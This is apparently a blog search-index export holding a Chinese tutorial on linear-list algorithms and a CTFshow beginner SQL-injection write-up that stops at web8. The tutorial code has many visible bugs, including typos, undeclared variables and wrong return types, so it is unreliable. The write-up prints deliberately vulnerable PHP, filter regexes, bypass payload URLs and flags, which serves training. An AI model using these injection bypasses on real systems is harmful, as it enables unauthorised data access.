<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>线性表的相关算法总结</title>
    <url>/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%BA%BF%E6%80%A7%E8%A1%A8%E7%9A%84%E7%9B%B8%E5%85%B3%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="顺序表的操作"><a class="markdownIt-Anchor" href="#顺序表的操作"></a> 顺序表的操作</h2>
<blockquote>
<p>更多内容请看https://blog.csdn.net/weixin_43790779</p>
</blockquote>
<h3 id="1-顺序表的存储结构定义"><a class="markdownIt-Anchor" href="#1-顺序表的存储结构定义"></a> 1. 顺序表的存储结构定义</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define MAXSIZE 100</span><br><span class="line">typedef int ElemType;</span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">	ElemType *elem;		&#x2F;&#x2F;存储空间基址</span><br><span class="line">	int length;			&#x2F;&#x2F;表长</span><br><span class="line">&#125;SqList;</span><br></pre></td></tr></table></figure>
<h3 id="2-初始化顺序表"><a class="markdownIt-Anchor" href="#2-初始化顺序表"></a> 2. 初始化顺序表</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void InitList_Sq(SqList &amp;L)</span><br><span class="line">&#123;</span><br><span class="line">	&#x2F;&#x2F;构造一个空的顺序表L。</span><br><span class="line">	L.elem &#x3D; new ElemType[MAXSIZE];</span><br><span class="line">	if(!L.elem)</span><br><span class="line">		exit(OVERFLOW); 	&#x2F;&#x2F; 存储分配失败</span><br><span class="line">	L.length &#x3D; 0;			&#x2F;&#x2F; 空表长度为0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-销毁顺序表"><a class="markdownIt-Anchor" href="#3-销毁顺序表"></a> 3. 销毁顺序表</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void DestroyList(SqList &amp;L)</span><br><span class="line">&#123;</span><br><span class="line">	if(L.elem)</span><br><span class="line">		delete(L.elem);		&#x2F;&#x2F;释放存储空间</span><br><span class="line">	L.length &#x3D; 0;</span><br><span class="line">	L.elem &#x3D; NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4-清空顺序表"><a class="markdownIt-Anchor" href="#4-清空顺序表"></a> 4. 清空顺序表</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void ClearList(SqList &amp;L)</span><br><span class="line">&#123;</span><br><span class="line">	L.length &#x3D; 0;		&#x2F;&#x2F;将线性表的长度置为0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="5-求顺序表的长度"><a class="markdownIt-Anchor" href="#5-求顺序表的长度"></a> 5. 求顺序表的长度</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int GetLength(SqList L)</span><br><span class="line">&#123;</span><br><span class="line">	return L.length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="6-判断顺序表是否为空"><a class="markdownIt-Anchor" href="#6-判断顺序表是否为空"></a> 6. 判断顺序表是否为空</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool IsEmpty(SqList L)</span><br><span class="line">&#123;</span><br><span class="line">	if(L.length &#x3D;&#x3D; 0)</span><br><span class="line">		return true;</span><br><span class="line">	else</span><br><span class="line">		return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="7-获取顺序表中的某个位置数据元素内容"><a class="markdownIt-Anchor" href="#7-获取顺序表中的某个位置数据元素内容"></a> 7. 获取顺序表中的某个位置数据元素内容</h3>
<p>时间复杂度为O(1)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void GetElem(SqList L,int i,ElemType &amp;e)</span><br><span class="line">&#123;</span><br><span class="line">	if(i&lt;1 || i&gt;L.length)	&#x2F;&#x2F;判断i值是否合理，若不合理，返回ERROR</span><br><span class="line">		return ERROR;</span><br><span class="line">	e &#x3D; L.elem[i-1];     &#x2F;&#x2F;i是元素在表中的位置</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="8-在顺序表中查找值为e的数据元素"><a class="markdownIt-Anchor" href="#8-在顺序表中查找值为e的数据元素"></a> 8. 在顺序表中查找值为e的数据元素</h3>
<p>时间复杂度为O(n)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int LocateElem(SqList L,ElemType e)</span><br><span class="line">&#123;</span><br><span class="line">	for(int i&#x3D;0;i&lt;L.length;i++)</span><br><span class="line">		if(L.elem[i] &#x3D;&#x3D; e)</span><br><span class="line">			return i+1;		&#x2F;&#x2F;i是存储单元的位置</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="9-在顺序表中插入一个数据元素"><a class="markdownIt-Anchor" href="#9-在顺序表中插入一个数据元素"></a> 9. 在顺序表中插入一个数据元素</h3>
<p>时间复杂度为O(n)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void ListInsert_Sq(SqList &amp;L,int i,ElemType e)</span><br><span class="line">&#123;</span><br><span class="line">	if(i&lt;1 || i&gt;L.length+1)		&#x2F;&#x2F;判断插入位置是否合法</span><br><span class="line">		return ERROR;</span><br><span class="line">	if(L.length &#x3D;&#x3D; MAXSIZE) 	&#x2F;&#x2F;当前存储空间是否已满</span><br><span class="line">		return ERROR;</span><br><span class="line">	for(int j &#x3D; L.length-1;j&gt;&#x3D;i-1;j--)		&#x2F;&#x2F;将元素后移</span><br><span class="line">		L.elem[j+1] &#x3D; L.elem[j];</span><br><span class="line">	L.elem[i-1] &#x3D; e;</span><br><span class="line">	++L.length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="10-删除顺序表中的第i个数据元素"><a class="markdownIt-Anchor" href="#10-删除顺序表中的第i个数据元素"></a> 10. 删除顺序表中的第i个数据元素</h3>
<p>时间复杂度为O(n)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void ListDelete_Sq(SqList &amp;L,int i)</span><br><span class="line">&#123;</span><br><span class="line">	if(i&lt;1 || i&gt;L.length)		&#x2F;&#x2F;判断插入位置是否合法</span><br><span class="line">		return ERROR;</span><br><span class="line">	for(int j&#x3D;i-1;j&lt;L.length;j++)		&#x2F;&#x2F;将元素前移</span><br><span class="line">		L.elem[j] &#x3D; L.elem[j+1];</span><br><span class="line">	--L.lehgth;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="链表的操作"><a class="markdownIt-Anchor" href="#链表的操作"></a> 链表的操作</h2>
<h3 id="1-单链表的存储结构定义"><a class="markdownIt-Anchor" href="#1-单链表的存储结构定义"></a> 1. 单链表的存储结构定义</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct LNode</span><br><span class="line">&#123;</span><br><span class="line">	ElemType data;			&#x2F;&#x2F;数据域</span><br><span class="line">	struct LNnode *next;	&#x2F;&#x2F;指针域</span><br><span class="line">&#125;LNode,*LinkList;			&#x2F;&#x2F;LinkList为LNode类型的指针</span><br></pre></td></tr></table></figure>
<h3 id="2-初始化单链表"><a class="markdownIt-Anchor" href="#2-初始化单链表"></a> 2. 初始化单链表</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void InitList_L(LinkList &amp;L)</span><br><span class="line">&#123;</span><br><span class="line">	L &#x3D; new LNode;</span><br><span class="line">	L-&gt;next &#x3D; NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-销毁单链表"><a class="markdownIt-Anchor" href="#3-销毁单链表"></a> 3. 销毁单链表</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void DestroyList_L(LinkList &amp;L)</span><br><span class="line">&#123;</span><br><span class="line">	LinkList p;</span><br><span class="line">	while(p)</span><br><span class="line">	&#123;</span><br><span class="line">		p &#x3D; L;</span><br><span class="line">		L &#x3D; L-&gt;next;</span><br><span class="line">		delete p;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4-清空单链表"><a class="markdownIt-Anchor" href="#4-清空单链表"></a> 4. 清空单链表</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void ClearList(LinkList &amp;L)</span><br><span class="line">&#123;</span><br><span class="line">	LinkList p,q;</span><br><span class="line">	p &#x3D; L-&gt;next;</span><br><span class="line">	while(p)			&#x2F;&#x2F;没到表尾 </span><br><span class="line">	&#123;</span><br><span class="line">		q &#x3D; p-&gt;next;	&#x2F;&#x2F;p指向第一个结点</span><br><span class="line">		delete p;</span><br><span class="line">		p &#x3D; q;</span><br><span class="line">	&#125;</span><br><span class="line">	L-&gt;next &#x3D; NULL;		&#x2F;&#x2F;头结点指针域为空 </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="5-求单链表的长度"><a class="markdownIt-Anchor" href="#5-求单链表的长度"></a> 5. 求单链表的长度</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int ListLength_L(LinkList L)</span><br><span class="line">&#123;</span><br><span class="line">	LinkList p;</span><br><span class="line">	p &#x3D; L-&gt;next;</span><br><span class="line">	count &#x3D; 0;</span><br><span class="line">	&#x2F;&#x2F;遍历单链表,统计结点数</span><br><span class="line">	while(p)</span><br><span class="line">	&#123;</span><br><span class="line">		++count;</span><br><span class="line">		p &#x3D; p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	return count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="6-判断单链表是否为空"><a class="markdownIt-Anchor" href="#6-判断单链表是否为空"></a> 6. 判断单链表是否为空</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool ListEmpty(LinkList L)</span><br><span class="line">&#123;</span><br><span class="line">	if(L-&gt;next)</span><br><span class="line">		return true;</span><br><span class="line">	else</span><br><span class="line">		return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="7-获取单链表中的某个数据元素内容"><a class="markdownIt-Anchor" href="#7-获取单链表中的某个数据元素内容"></a> 7. 获取单链表中的某个数据元素内容</h3>
<p>时间复杂度为O(n)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;获取第i个位置的元素</span><br><span class="line">void GetElem_L(LinkList L,int i,ElemType &amp;e)</span><br><span class="line">&#123;</span><br><span class="line">	LinkList p &#x3D; L-&gt;next;</span><br><span class="line">	int j &#x3D; 1; </span><br><span class="line">	&#x2F;&#x2F;向后扫描，直到p指向第i个元素或p为空 </span><br><span class="line">	while(p &amp;&amp; j&lt;i)</span><br><span class="line">	&#123;</span><br><span class="line">		p &#x3D; p-&gt;next;</span><br><span class="line">		++j;</span><br><span class="line">	&#125;</span><br><span class="line">	if(!p || j&gt;i)			&#x2F;&#x2F;第i个元素不存在 </span><br><span class="line">		return ERROR;</span><br><span class="line">	e &#x3D; p-&gt;data;			&#x2F;&#x2F;取第i个元素 </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="8-检索值为e的数据元素"><a class="markdownIt-Anchor" href="#8-检索值为e的数据元素"></a> 8. 检索值为e的数据元素</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LNode *LocateElem_L(LinkList L,ElemType e)</span><br><span class="line">&#123;</span><br><span class="line">	p &#x3D; L-&gt;next;</span><br><span class="line">	while(p &amp;&amp; p-&gt;data !&#x3D; e)</span><br><span class="line">		p &#x3D; p-&gt;next;</span><br><span class="line">	&#x2F;&#x2F;返回L中值为e的数据元素的位置，查找失败返回NULL </span><br><span class="line">	return p;				</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="9-在单链表中插入一个数据元素"><a class="markdownIt-Anchor" href="#9-在单链表中插入一个数据元素"></a> 9. 在单链表中插入一个数据元素</h3>
<p>时间复杂度为O(1)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void ListInsert_L(LinkList L,int i,ElemType e)</span><br><span class="line">&#123;</span><br><span class="line">	p &#x3D; L;</span><br><span class="line">	j &#x3D; 0;</span><br><span class="line">	&#x2F;&#x2F;寻找第i−1个结点 </span><br><span class="line">	while(p &amp;&amp; j&lt;i-1)</span><br><span class="line">	&#123;</span><br><span class="line">		p &#x3D; p-&gt;next;</span><br><span class="line">		++j;</span><br><span class="line">	&#125;</span><br><span class="line">	&#x2F;&#x2F;i大于表长 + 1或者小于1  </span><br><span class="line">	if(!p || j&gt;i-1)</span><br><span class="line">		return ERROR;</span><br><span class="line">	&#x2F;&#x2F;生成新结点*s </span><br><span class="line">	s &#x3D; new LNode;</span><br><span class="line">	s-&gt;data &#x3D; e;           &#x2F;&#x2F;将结点*s的数据域置为e </span><br><span class="line">	s-&gt;next &#x3D; p-&gt;next;	   &#x2F;&#x2F;将结点*s插入L中 </span><br><span class="line">	p-&gt;next &#x3D; s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="10-删除单链表中第i个数据"><a class="markdownIt-Anchor" href="#10-删除单链表中第i个数据"></a> 10. 删除单链表中第i个数据</h3>
<p>时间复杂度为O(1)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void ListDelete_L(LinkList L,int i,ElemType &amp;e)</span><br><span class="line">&#123;</span><br><span class="line">	p &#x3D; L;</span><br><span class="line">	j &#x3D; 0;</span><br><span class="line">	&#x2F;&#x2F;寻找第i个结点，并令p指向其前驱 </span><br><span class="line">	while(p-&gt;next &amp;&amp; j&lt;i-1)</span><br><span class="line">	&#123;</span><br><span class="line">		p &#x3D; p-&gt;next;</span><br><span class="line">		++j;</span><br><span class="line">	&#125;</span><br><span class="line">	&#x2F;&#x2F;删除位置不合理 </span><br><span class="line">	if(!p-&gt;next || j&gt;i-1)</span><br><span class="line">		return ERROR;</span><br><span class="line">	&#x2F;&#x2F;临时保存被删结点的地址以备释放 </span><br><span class="line">	r &#x3D; p-&gt;next;</span><br><span class="line">	&#x2F;&#x2F;改变删除结点前驱结点的指针域 </span><br><span class="line">	p-&gt;next &#x3D; r-&gt;next;</span><br><span class="line">	e &#x3D; r-&gt;data;</span><br><span class="line">	&#x2F;&#x2F;释放结点 </span><br><span class="line">	delete r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="11-单链表的建立"><a class="markdownIt-Anchor" href="#11-单链表的建立"></a> 11. 单链表的建立</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;前插法</span><br><span class="line">void CreateList_H(LinkList &amp;L,int n)</span><br><span class="line">&#123;</span><br><span class="line">	L &#x3D; new LNode;</span><br><span class="line">	L-&gt;next &#x3D; NULL;			&#x2F;&#x2F;先建立一个带头结点的单链表 </span><br><span class="line">	for(int i&#x3D;n;i&gt;0;i--)</span><br><span class="line">	&#123;</span><br><span class="line">		p &#x3D; new LNode;		&#x2F;&#x2F;生成新结点 </span><br><span class="line">		cin &gt;&gt; p-&gt;data;</span><br><span class="line">		p-&gt;next &#x3D; L-&gt;next;</span><br><span class="line">		L-&gt;next &#x3D; p;		&#x2F;&#x2F;插入到表头 </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;后插法</span><br><span class="line">&#x2F;&#x2F;正位序输入n个元素的值，建立带表头结点的单链表L </span><br><span class="line">void GreateList_R(LinkList &amp;L,int n)</span><br><span class="line">&#123;</span><br><span class="line">	L &#x3D; new LNode;</span><br><span class="line">	L-&gt;next &#x3D; NULL;</span><br><span class="line">	r &#x3D; L;				&#x2F;&#x2F;尾指针r指向头结点 </span><br><span class="line">	for(int i&#x3D;0;i&lt;n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		p &#x3D; new LNode;	&#x2F;&#x2F;生成新结点 </span><br><span class="line">		cin &gt;&gt; p-&gt;data;</span><br><span class="line">		p-&gt;next &#x3D; NULL;</span><br><span class="line">		r-&gt;next &#x3D; p;		&#x2F;&#x2F;插入到表尾 </span><br><span class="line">		r &#x3D; p;				&#x2F;&#x2F;r指向新的尾结点 </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="线性表的应用"><a class="markdownIt-Anchor" href="#线性表的应用"></a> 线性表的应用</h2>
<h3 id="1-线性表的合并"><a class="markdownIt-Anchor" href="#1-线性表的合并"></a> 1. 线性表的合并</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void union(List &amp;La,List &amp;Lb)</span><br><span class="line">&#123;</span><br><span class="line">	La_len &#x3D; ListLength(La);		&#x2F;&#x2F;线性表La的长度</span><br><span class="line">	Lb_len &#x3D; ListLength(Lb);		&#x2F;&#x2F;线性表Lb的长度</span><br><span class="line">	for(int i&#x3D;1;i&lt;&#x3D;La_length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		GetElem(Lb,i,e);			&#x2F;&#x2F; 取Lb中第i个数据元素赋给e</span><br><span class="line">		&#x2F;&#x2F; La中不存在和 e 相同的数据元素，则插入之</span><br><span class="line">		if(!LocateElem(La,e))</span><br><span class="line">			ListInsert(La,++La_len,e);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-链式有序表的合并"><a class="markdownIt-Anchor" href="#2-链式有序表的合并"></a> 2. 链式有序表的合并</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;按值排序的单链表LA,LB，归并为LC后也按值排序</span><br><span class="line">void MergeList_L(LinkList &amp;La,LinkList &amp;Lb,LinkList &amp;Lc)</span><br><span class="line">&#123;</span><br><span class="line">	&#x2F;&#x2F;初始化  </span><br><span class="line">	pa &#x3D; La-&gt;next;</span><br><span class="line">	pb &#x3D; Lb-&gt;next;</span><br><span class="line">	Lc &#x3D; pc &#x3D; La;</span><br><span class="line">	&#x2F;&#x2F;将pa 、pb结点按大小依次插入C中</span><br><span class="line">	while(pa &amp;&amp; pb)</span><br><span class="line">	&#123;</span><br><span class="line">		if(pa-&gt;data &lt;&#x3D; pb-&gt;data)</span><br><span class="line">		&#123;</span><br><span class="line">			pc-&gt;next &#x3D; pa;</span><br><span class="line">			pc &#x3D; pa;</span><br><span class="line">			pa &#x3D; pa-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			pc-&gt;next &#x3D; pb;</span><br><span class="line">			pc &#x3D; pb;</span><br><span class="line">			pb &#x3D; pb-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	&#x2F;&#x2F;插入剩余段</span><br><span class="line">	pc-&gt;next &#x3D; pa?pa:pb;</span><br><span class="line">	&#x2F;&#x2F;释放Lb的头结点</span><br><span class="line">	delete pb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-顺序有序表的合并"><a class="markdownIt-Anchor" href="#3-顺序有序表的合并"></a> 3. 顺序有序表的合并</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void MergeList(List La,List Lb,List &amp;Lc)</span><br><span class="line">&#123;</span><br><span class="line">	InitList(Lc);</span><br><span class="line">	i &#x3D; j &#x3D; 1;</span><br><span class="line">	k &#x3D; 0;</span><br><span class="line">	La_len &#x3D; ListLength(La);</span><br><span class="line">	La_len &#x3D; ListLength(La);</span><br><span class="line">	while(i&lt;&#x3D;La_len)&amp;&amp;(j&lt;&#x3D;Lb_len)</span><br><span class="line">	&#123;   	</span><br><span class="line">		GetElem(La,i,ai); </span><br><span class="line">		GetElem(Lb,j,bj);</span><br><span class="line">		if (ai&lt;&#x3D;bj)</span><br><span class="line">		&#123;</span><br><span class="line">			ListInsert(Lc,++k,ai);</span><br><span class="line">			++i;</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">            ListInsert(Lc,++k,bj);</span><br><span class="line">            ++j;</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     while (i&lt;&#x3D;La_len)</span><br><span class="line">     &#123;</span><br><span class="line">     	GetElem(La,i++,ai);</span><br><span class="line">     	ListInsert(Lc,++k,ai);</span><br><span class="line">     &#125;</span><br><span class="line">     while (j&lt;&#x3D;Lb_len)</span><br><span class="line">     &#123;</span><br><span class="line">     	GetElem(Lb,j++,bj);</span><br><span class="line">     	ListInsert(Lc,++k,bj);</span><br><span class="line">     &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>算法 数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFSHOW【萌新计划】Writeup</title>
    <url>/CTF/writeup09/</url>
    <content><![CDATA[<h2 id="萌新计划web1"><a class="markdownIt-Anchor" href="#萌新计划web1"></a> 【萌新计划】web1</h2>
<p><strong>题目：</strong>  代码很安全，没有漏洞。<br />
<strong>解题思路：</strong> 题目代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 包含数据库连接文件</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="comment"># 判断get提交的参数id是否存在</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    <span class="comment"># 判断id的值是否大于999</span></span><br><span class="line">    <span class="keyword">if</span>(intval($id) &gt; <span class="number">999</span>)&#123;</span><br><span class="line">        <span class="comment"># id 大于 999 直接退出并返回错误</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"id error"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment"># id 小于 999 拼接sql语句</span></span><br><span class="line">        $sql = <span class="string">"select * from article where id = $id order by id limit 1 "</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"执行的sql为：$sql&lt;br&gt;"</span>;</span><br><span class="line">        <span class="comment"># 执行sql 语句</span></span><br><span class="line">        $result = $conn-&gt;query($sql);</span><br><span class="line">        <span class="comment"># 判断有没有查询结果</span></span><br><span class="line">        <span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment"># 如果有结果，获取结果对象的值$row</span></span><br><span class="line">            <span class="keyword">while</span>($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"id: "</span> . $row[<span class="string">"id"</span>]. <span class="string">" - title: "</span> . $row[<span class="string">"title"</span>]. <span class="string">" &lt;br&gt;&lt;hr&gt;"</span> . $row[<span class="string">"content"</span>]. <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 关闭数据库连接</span></span><br><span class="line">        $conn-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- flag in id = <span class="number">1000</span> --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>提示flag在id=1000，可是id不能等于1000，构造如下url</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">https://71233d4d-e0f8<span class="string">-4</span>cba<span class="string">-92</span>ba<span class="string">-8</span>f77a48f607b.chall.ctf.show/?id=100 or id=1000</span><br></pre></td></tr></table></figure>
<p>得到flag，flag{6f5ec2a3-67f5-45c7-ad53-b725b1107435}</p>
<p><img src="https://img-blog.csdnimg.cn/20200516213954273.png#pic_center" alt="在这里插入图片描述" /></p>
<h2 id="萌新计划web2"><a class="markdownIt-Anchor" href="#萌新计划web2"></a> 【萌新计划】web2</h2>
<p><strong>题目：</strong>  管理员赶紧修补了漏洞，这下应该没问题了吧？<br />
<strong>解题思路：</strong> 题目代码和上一题相似，不过过滤了or</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/or|\+/i"</span>,$id))</span><br></pre></td></tr></table></figure>
<p>构造如下url</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//2313fea2-de54-48db-b262-3dc6b0fb012f.chall.ctf.show/?id=100 || id=1000</span></span><br></pre></td></tr></table></figure>
<p>得到flag，flag{9dfca7d9-e325-4ed8-9cfe-73c3d3aeacc9}。</p>
<p><img src="https://img-blog.csdnimg.cn/20200516214008610.PNG#pic_center" alt="在这里插入图片描述" /></p>
<h2 id="萌新计划web3"><a class="markdownIt-Anchor" href="#萌新计划web3"></a> 【萌新计划】web3</h2>
<p><strong>题目：</strong>  管理员被狠狠的教育了，所以决定好好修复一番。这次没问题了。<br />
<strong>解题思路：</strong> 题目代码增加了过滤符号</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/or|\-|\\|\*|\&lt;|\&gt;|\!|x|hex|\+/i"</span>,$id))&#123;</span><br></pre></td></tr></table></figure>
<p>构造与上一题相同url即可，flag{41918340-c0cd-4792-98a3-52f0294262e0}。</p>
<h2 id="萌新计划web4"><a class="markdownIt-Anchor" href="#萌新计划web4"></a> 【萌新计划】web4</h2>
<p><strong>题目：</strong>  管理员阿呆又失败了，这次一定要堵住漏洞<br />
<strong>解题思路：</strong> 题目代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/or|\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i"</span>,$id))</span><br></pre></td></tr></table></figure>
<p>构造与上一题相同url即可，flag{4a5d7186-6d01-4425-8930-273e60cef3b9}。</p>
<h2 id="萌新计划web5"><a class="markdownIt-Anchor" href="#萌新计划web5"></a> 【萌新计划】web5</h2>
<p><strong>题目：</strong>  阿呆被老板狂骂一通，决定改掉自己大意的毛病，痛下杀手，修补漏洞。<br />
<strong>解题思路：</strong> 题目代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/\'|\"|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i"</span>,$id))</span><br></pre></td></tr></table></figure>
<p>利用字节操作，构造url</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">https://<span class="number">34372a31</span>-<span class="number">4e08-4272</span>-<span class="number">8</span>c76-ad<span class="number">83b58f8a09</span>.chall.ctf.show/?id=~~<span class="number">1000</span></span><br></pre></td></tr></table></figure>
<p>得到flag，flag{7557dd2b-8ad5-4237-a42b-65428442a02a}。</p>
<h2 id="萌新计划web6"><a class="markdownIt-Anchor" href="#萌新计划web6"></a> 【萌新计划】web6</h2>
<p><strong>题目：</strong>  阿呆一口老血差点噎死自己，决定杠上了<br />
<strong>解题思路：</strong> 题目代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/\'|\"|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|x|hex|\(|\)|\+|select/i"</span>,$id))</span><br></pre></td></tr></table></figure>
<p>构造与上一题相同url，得到flag，flag{82754c8a-2429-4be9-9420-aa9d5152c44a}。</p>
<h2 id="萌新计划web7"><a class="markdownIt-Anchor" href="#萌新计划web7"></a> 【萌新计划】web7</h2>
<p><strong>题目：</strong>  阿呆得到最高指示，如果还出问题，就卷铺盖滚蛋，阿呆心在流血。<br />
<strong>解题思路：</strong> 题目代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/\'|\"|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|\~|x|hex|\(|\)|\+|select/i"</span>,$id))</span><br></pre></td></tr></table></figure>
<p>利用进制转换，构造如下url</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">https://dfb305c2-9c40-<span class="number">4b41</span>-<span class="number">8912</span>-ae008639c5f0.chall.ctf.<span class="built_in">show</span>/?id=<span class="number">0b001111101000</span></span><br></pre></td></tr></table></figure>
<p>得到flag，flag{2a0d2647-60b2-4025-bfa2-646c017b0c45}。</p>
<h2 id="萌新计划web8"><a class="markdownIt-Anchor" href="#萌新计划web8"></a> 【萌新计划】web8</h2>
<p><strong>题目：</strong>  阿呆熟悉的一顿操作，去了埃塞尔比亚。PS:阿呆第一季完，敬请期待第二季！<br />
<strong>解题思路：</strong> 题目代码</p>
